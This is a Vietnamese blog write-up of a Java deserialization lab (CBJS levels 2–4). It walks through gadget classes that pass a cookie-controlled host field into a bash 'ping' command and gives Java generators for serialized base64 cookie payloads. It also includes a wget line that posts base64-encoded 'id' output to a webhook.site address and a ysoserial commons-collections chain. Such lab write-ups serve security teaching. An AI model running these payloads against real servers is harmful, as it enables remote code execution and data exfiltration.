class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123; <span class="comment">//getName ở đây</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Vậy nên ta sẽ đi đến với 3 class mới để tìm gadget gọi đến magic method để xem liệu có hướng nào không.</p>
<p>Đến với class HTTPConnection thì có vẻ như không có cái gì đặc biệt ở đây để khai thác:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.javadeserialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HTTPConnection</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String url;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">HTTPConnection</span><span class="params">(String url)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.url = url;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">connect</span><span class="params">()</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> connect to this.url</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Nó chỉ khởi tạo biến url sau đó thực hiện connect.</p>
<p>Ở class MyHTTPClient.java ta nhận thấy có 2 cái sink khả nghi có thể khai thác được đó là ở hàm <code>sendRequest()</code> và hàm <code>readObject()</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sendRequest</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;/bin/bash&quot;</span>;</span><br><span class="line">        <span class="type">ProcessBuilder</span> <span class="variable">pb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(path, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;curl &quot;</span> + <span class="built_in">this</span>.host);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">curlProcess</span> <span class="operator">=</span> pb.start();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, InterruptedException &#123;</span><br><span class="line">       in.defaultReadObject();</span><br><span class="line">       <span class="comment">// Test connection</span></span><br><span class="line">       <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;/bin/bash&quot;</span>;</span><br><span class="line">       <span class="type">ProcessBuilder</span> <span class="variable">pb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(path, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;ping &quot;</span> + <span class="built_in">this</span>.host);</span><br><span class="line">       <span class="type">Process</span> <span class="variable">ping</span> <span class="operator">=</span> pb.start();</span><br><span class="line">       <span class="type">int</span> <span class="variable">exitCode</span> <span class="operator">=</span> ping.waitFor();</span><br><span class="line">       <span class="comment">// <span class="doctag">TODO:</span> add implement for exitCode check</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>Ở đây ProcessBuilder là một hàm nguy hiểm nó có thể chạy tiến trình tới đường dẫn mà dev truyền vào và ở đây đoạn <code>sendRequest()</code> nó đang thực hiện <code>curl</code> đến với giá trị <code>this.host</code> đây là một sink hoàn toàn có khả năng thực hiện <code>OS command Injection</code> vậy nên bây giờ ta phải tìm được nơi gọi đến hàm <code>sendRequest()</code> để củng cố kịch bản.</p>
<p><img src="https://hackmd.io/_uploads/HyKLgah6le.png" alt="image"></p>
<p>Ở class MyRequestServlet.java ta tìm được nơi gọi đến function <code>sendRequest()</code> nhưng ở đây nó đã bị comment lại nên có vẻ sẽ không có kịch bản khai thác hàm này ở đây.</p>
<p>Bây giờ ta sẽ chỉ còn lại 1 sink đó là ở hàm <code>readObject()</code> ta có thể nhận ra ngay rằng hàm <code>readObject</code> này là một magic method nó sẽ được tự động gọi khi chương trình tiến hành deserialize data và truyền giá trị vào OS Command ở dòng <code>        ProcessBuilder pb = new ProcessBuilder(path, &quot;-c&quot;, &quot;ping &quot; + this.host);</code></p>
<p><img src="https://hackmd.io/_uploads/Hk7jz6hpgx.png" alt="image"></p>
<p>Vậy ở đây ta hoàn toàn có thể lợi dụng nó để tiến hành nối dài câu OS Command ở đây ta sẽ inject thêm ở <code>this.host</code> thành <code>xxxx; id</code> dấu <code>;</code> sẽ thực hiện nối dài câu OS Command và thực thi thêm câu lệnh <code>id</code> ở đằng sau.</p>
<p>Bây giờ ta sẽ thực hiện phần code exploit, phần code sẽ không khác gì cũ ta sẽ chỉ cần copy 3 class mới vào thêm vào đó ta tiến hành code sửa lại phần hàm.</p>
<p><img src="https://hackmd.io/_uploads/Sk9tVTn6le.png" alt="image"></p>
<p>Ở đây ta khởi tạo <code>MyHTTPClient</code> và thực hiện gọi <code>xxxx; id</code> vì ở đây phần mình inject đó sẽ được gọi vào <code>this.host</code>.</p>
<p>Đó là logic tấn công của ta bây giờ sẽ là code để gen ra được payload:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.javadeserialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GeneratePayload</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          </span><br><span class="line">            <span class="type">String</span> <span class="variable">commandToInject</span> <span class="operator">=</span> <span class="string">&quot;xxxx; id&quot;</span>; </span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;&gt;&gt;&gt; Gen payload Level 2...&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;&gt;&gt;&gt; Inject: &#x27;&quot;</span> + commandToInject + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Bước 1: Tạo đối tượng gadget MyHTTPClient với payload của chúng ta</span></span><br><span class="line">            <span class="type">MyHTTPClient</span> <span class="variable">payloadObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyHTTPClient</span>(commandToInject);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;&gt;&gt;&gt; Process...&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Bước 2 &amp; 3: Serialize và encode Base64 (giữ nguyên như cũ)</span></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line"></span><br><span class="line">            objectOutputStream.writeObject(payloadObject);</span><br><span class="line">            objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">byte</span>[] serializedBytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">            <span class="type">String</span> <span class="variable">base64Payload</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(serializedBytes);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Bước 4: In ra kết quả cuối cùng</span></span><br><span class="line">            System.out.println(<span class="string">&quot;\n--- Done! ---&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;Cookie Level 2:&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;======================================================================&quot;</span>);</span><br><span class="line">            System.out.println(base64Payload);</span><br><span class="line">            System.out.println(<span class="string">&quot;======================================================================&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://hackmd.io/_uploads/ryNb8phTgl.png" alt="image"></p>
<p>Thành công gen ra được cookie payload : <code>rO0ABXNyAChjb20uZXhhbXBsZS5qYXZhZGVzZXJpYWxpemUuTXlIVFRQQ2xpZW50xxgQsBtC2FUCAAFMAARob3N0dAASTGphdmEvbGFuZy9TdHJpbmc7eHIAKmNvbS5leGFtcGxlLmphdmFkZXNlcmlhbGl6ZS5IVFRQQ29ubmVjdGlvbjaZ6lLJoIWoAgABTAADdXJscQB+AAF4cHQAD2h0dHA6Ly94eHh4OyBpZHQACHh4eHg7IGlk</code></p>
<p><img src="https://hackmd.io/_uploads/B1-EI626ll.png" alt="image"></p>
<p>Tiến hành inject cookie mới vào xem thử kết quả sẽ trả về như thế nào.</p>
<p><img src="https://hackmd.io/_uploads/Bk3BLa2pge.png" alt="image"></p>
<p>Kết quả có vẻ không như mong muốn có vẻ như ta đã làm sai ở một bước nào đó bây giờ kiểm tra lại code đoạn thực hiện deserialize vì lỗi này nó nằm ở catch của phần deserialize.</p>
<p><img src="https://hackmd.io/_uploads/r1A6La36xe.png" alt="image"></p>
<p>Để ý rằng ở đây có vẻ như cookie bị ép kiểu thành user nên có vẻ chính nó đã gây lỗi ở phần cookie nên nó trả về exception. Nhưng liệu trước khi chạm đến phần deserialize thì liệu nó đã thực thi OS Command chưa bây giờ ta sẽ thử Debug.</p>
<p><img src="https://hackmd.io/_uploads/B1kytp26gl.png" alt="image"></p>
<p>Ta có thể thấy rằng giá trị của this.host đã được gán và thực thi vậy ở đây ta có thể kết luận là blind OS Command Injection bây giờ ta có 3 cách đó là đưa kết quả ra ngoài , error based và time based ta sẽ chọn cách đưa kết quả ra ngoài bằng webhook cho dễ.</p>
<p><code>String commandToInject = &quot;xxxx; wget https://webhook.site/12df02bf-338e-46a4-bed3-363434d64f1e&quot;;  </code></p>
<p>Sửa thành như này xem liệu bên webhook có nhận request hay không.</p>
<p><img src="https://hackmd.io/_uploads/rk4x9p26ge.png" alt="image"></p>
<p>Thành công nhận được request đến từ server đến webhook bây giờ ta sửa một chút ở PayloadGenerate.java để nó đưa kết quả của câu lệnh <code>id</code> ra.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">           <span class="type">String</span> <span class="variable">commandToRun</span> <span class="operator">=</span> <span class="string">&quot;id&quot;</span>; <span class="comment">// &lt;-- BẠN CÓ THỂ THAY LỆNH Ở ĐÂY (ví dụ: &quot;whoami&quot;, &quot;ls -la /&quot;)</span></span><br><span class="line"></span><br><span class="line">           <span class="comment">// Lệnh đầy đủ sẽ được inject vào shell</span></span><br><span class="line">           <span class="type">String</span> <span class="variable">commandToExfiltrate</span> <span class="operator">=</span> <span class="string">&quot;wget --no-check-certificate --post-data=\&quot;$(&quot;</span> + commandToRun + <span class="string">&quot; | base64)\&quot; https://webhook.site/12df02bf-338e-46a4-bed3-363434d64f1e&quot;</span>;</span><br><span class="line"></span><br><span class="line">           <span class="comment">// Payload cuối cùng để inject vào `ping`</span></span><br><span class="line">           <span class="type">String</span> <span class="variable">finalPayload</span> <span class="operator">=</span> <span class="string">&quot;xxxx; &quot;</span> + commandToExfiltrate;</span><br><span class="line"></span><br><span class="line">           System.out.println(<span class="string">&quot;&gt;&gt;&gt; Generate Payload &#x27;&quot;</span> + commandToRun + <span class="string">&quot;&#x27; ra webhook...&quot;</span>);</span><br><span class="line">           System.out.println(<span class="string">&quot;&gt;&gt;&gt; Commands: &quot;</span> + finalPayload);</span><br></pre></td></tr></table></figure>

<p><img src="https://hackmd.io/_uploads/S1qRnanTeg.png" alt="image"></p>
<p>Thành công trả về giá trị sau khi của kết quả câu lệnh id ở đây mình encode thành base64 để tránh các lỗi không mong muốn.</p>
<p><img src="https://hackmd.io/_uploads/Hk9bpThTxg.png" alt="image"></p>
<p>Kết quả đúng với câu lệnh kết luận ta đã thành công RCE.</p>
<h3 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3:"></a>Level 3:</h3><p>Với level 3 thì chức năng vẫn sẽ tương tự với các level trước nên ta đi thẳng vào phân tích source code luôn.</p>
<p>Phần lớn source code vẫn sẽ giống như là level 2 khác cái giờ không có readObject để lợi dụng như level 2 nữa nên ta sẽ phân tích những đoạn sink có thể khai thác được.</p>
<p>Sau một lúc đọc thì tôi tìm thấy sink có thể khai thác được ở class MyHTTPClient.java.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">connect</span><span class="params">()</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line">       <span class="comment">// Test connection</span></span><br><span class="line">       <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;/bin/bash&quot;</span>;</span><br><span class="line">       <span class="type">ProcessBuilder</span> <span class="variable">pb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(path, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;ping &quot;</span> + <span class="built_in">this</span>.host);</span><br><span class="line">       <span class="type">Process</span> <span class="variable">ping</span> <span class="operator">=</span> pb.start();</span><br><span class="line">       <span class="type">int</span> <span class="variable">exitCode</span> <span class="operator">=</span> ping.waitFor();</span><br><span class="line">       <span class="comment">// <span class="doctag">TODO:</span> add implement for exitCode check</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>Ở đây có function là <code>connect()</code> bên trong là hàm <code>ProcessBuilder</code> là một unsafe method cùng với đó là câu lệnh OS Command được thực thi bằng nó đây là sự kết hợp giữa Untrusted Data cùng với Unsafe method và ta hoàn toàn có thể lợi dụng nó để thực hiện CMDi như ở level trước vấn đề bây giờ ta phải tìm xem class nào gọi đến hàm <code>connect()</code>.</p>
<p>Ở class TestConnection.java ta đã tìm thấy <code>connect()</code> được gọi.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, InterruptedException &#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        <span class="comment">// Re-create the connection</span></span><br><span class="line">        <span class="built_in">this</span>.connection.connect();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>Từ đây ta đã hoàn thiện sink rồi bây giờ chỉ cần tạo thêm object <code>TestConnection</code> vì trong đó có <code>readObject</code> để gọi hàm <code>connect()</code>.</p>
<p><img src="https://hackmd.io/_uploads/rJKJJSppxl.png" alt="image"></p>
<p>Bây giờ viết payload để in ra được cookie và tiến hành inject thôi.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.javadeserialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GeneratePayload</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">commandToRun</span> <span class="operator">=</span> <span class="string">&quot;id&quot;</span>; </span><br><span class="line">            <span class="type">String</span> <span class="variable">commandToExfiltrate</span> <span class="operator">=</span> <span class="string">&quot;wget --no-check-certificate --post-data=\&quot;$(&quot;</span> + commandToRun + <span class="string">&quot; | base64)\&quot; https://webhook.site/12df02bf-338e-46a4-bed3-363434d64f1e&quot;</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">finalPayload</span> <span class="operator">=</span> <span class="string">&quot;xxxx; &quot;</span> + commandToExfiltrate;</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;&gt;&gt;&gt; Generating Java deserialization payload...&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;&gt;&gt;&gt; Command to be executed on server: &quot;</span> + finalPayload);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Step 1: Create the &quot;inner&quot; object (Sink)</span></span><br><span class="line">            <span class="comment">// This is the MyHTTPClient object containing our malicious command.</span></span><br><span class="line">            <span class="type">MyHTTPClient</span> <span class="variable">maliciousHttpClient</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyHTTPClient</span>(finalPayload);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Step 2: Create the &quot;outer&quot; object (Entry Point)</span></span><br><span class="line">            <span class="comment">// This is the TestConnection object that will be deserialized by the server.</span></span><br><span class="line">            <span class="comment">// We inject our malicious object into its `connection` field.</span></span><br><span class="line">            <span class="type">TestConnection</span> <span class="variable">payloadObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestConnection</span>(maliciousHttpClient);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;&gt;&gt;&gt; Gadget chain created. Starting serialization and encoding...&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Step 3 &amp; 4: Serialize and encode Base64 (unchanged)</span></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Write the TestConnection object (which contains MyHTTPClient) to the stream</span></span><br><span class="line">            objectOutputStream.writeObject(payloadObject);</span><br><span class="line">            objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">byte</span>[] serializedBytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">            <span class="type">String</span> <span class="variable">base64Payload</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(serializedBytes);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Step 5: Print the final result</span></span><br><span class="line">            System.out.println(<span class="string">&quot;\n--- Done! ---&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;Cookie Level 3 (Gadget Chain):&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;======================================================================&quot;</span>);</span><br><span class="line">            System.out.println(base64Payload);</span><br><span class="line">            System.out.println(<span class="string">&quot;======================================================================&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;&gt;&gt;&gt; An error occurred!&quot;</span>);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://hackmd.io/_uploads/HJnLxSa6xe.png" alt="image"></p>
<p>Thành công gen ra được cookie mới của level 3.</p>
<p><img src="https://hackmd.io/_uploads/HkhdeHpTll.png" alt="image"></p>
<p>Thay cookie mới vào và lưu nó lại.</p>
<p><img src="https://hackmd.io/_uploads/SJXqgrpaex.png" alt="image"></p>
<p>Server trả về kết quả như này nhưng không cần quan tâm vì như đã debug ở bài trước thì quá trình deserialize được thực thi trước khi nổ ra lỗi.</p>
<p><img src="https://hackmd.io/_uploads/BJiTeH6agl.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/rygJkZHTpel.png" alt="image"></p>
<p>Thành công RCE ở level 3.</p>
<h3 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4:"></a>Level 4:</h3><p>Đến với level 4 thì chức năng của nó trên GUI thì vẫn sẽ như cũ nên ta sẽ nhìn thẳng vào source code luôn.</p>
<p>Ở level này các class khác đã bị loại bỏ hết chỉ còn mỗi 2 class chính là:</p>
<ul>
<li>HelloServlet.java</li>
<li>User.java</li>
</ul>
<p>Cũng tựa tựa như level 1 khi chỉ có mỗi 2 class còn lại bây giờ ta sẽ đi vào 2 class duy nhất để xem thử có đường nào để có thể khai thác hay không.</p>
<p>Sau một lúc đọc 2 class thì nó cũng hầu như không có hướng để có thể khai thác được vì ta chỉ có duy nhất class User để gọi method nhưng không có gì ở bên trong nên ta sẽ phân tích thử các file được include vào.</p>
<p>Ở file pom.xml có một đoạn có khả năng đưa cho ta thông tin để có thể tìm kiếm gadget trên mạng.</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://hackmd.io/_uploads/BkLNNHTTee.png" alt="image"></p>
<p>Sau một lúc tìm kiếm nhận ra rằng ysoserial có gadget để khai thác đực commons-collections ver 3.1 đã được include trong dependency của server.</p>
<p><img src="https://hackmd.io/_uploads/ryh3US6agg.png" alt="image"></p>
<p>Dùng ysoserial thành công tạo được cookie để payload bây giờ tiến hành inject.</p>
<p><img src="https://hackmd.io/_uploads/ByZdPS6pxg.png" alt="image"></p>
<p>Thay cookie và save vào.</p>
<p><img src="https://hackmd.io/_uploads/HyotvBT6el.png" alt="image"></p>
<p>Thành công lấy được request về giờ ta đã RCE thành công level cuối cùng của bài deserialize.</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://pzhat.github.io">Phat Mai</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://pzhat.github.io/2025/11/15/2025-10-15-CBJS-Java-Deserialize/">https://pzhat.github.io/2025/11/15/2025-10-15-CBJS-Java-Deserialize/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/Web/">Web</a></div><div class="post-share"><div class="social-share" data-image="/img/butterfly-icon.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/11/15/2025-10-28-Ysoserial-URLDNS/" title="Java Deserialze - URLDNS Chain analysis (ysoserial)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">Java Deserialze - URLDNS Chain analysis (ysoserial)</div></div><div class="info-2"><div class="info-item-1">Java Deserialze - URLDNS Chain analysis (ysoserial) Java Deserialize là gì? Java cung cấp cho người dùng hàm writeObject() để tiến hành quá trình serialize các object ở đây quá trình serialize sinh ra để chuyển một đối tượng Java thành chuỗi byte để lưu trữ (file, DB) hoặc truyền qua mạng (socket, RMI, JMS). Và để có thể đọc được dữ liệu được serialize từ ObjectInputStream ta có quá trình deserialize ở java sử dụng hàm readObject() cho quá trình đó.  Khai thác Java Object Injection Rủi ro sẽ ...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-10-10-PentesterLab-From-Sql-To-Shell/" title="Pentester Lab From Sql Injection to Shell"><div 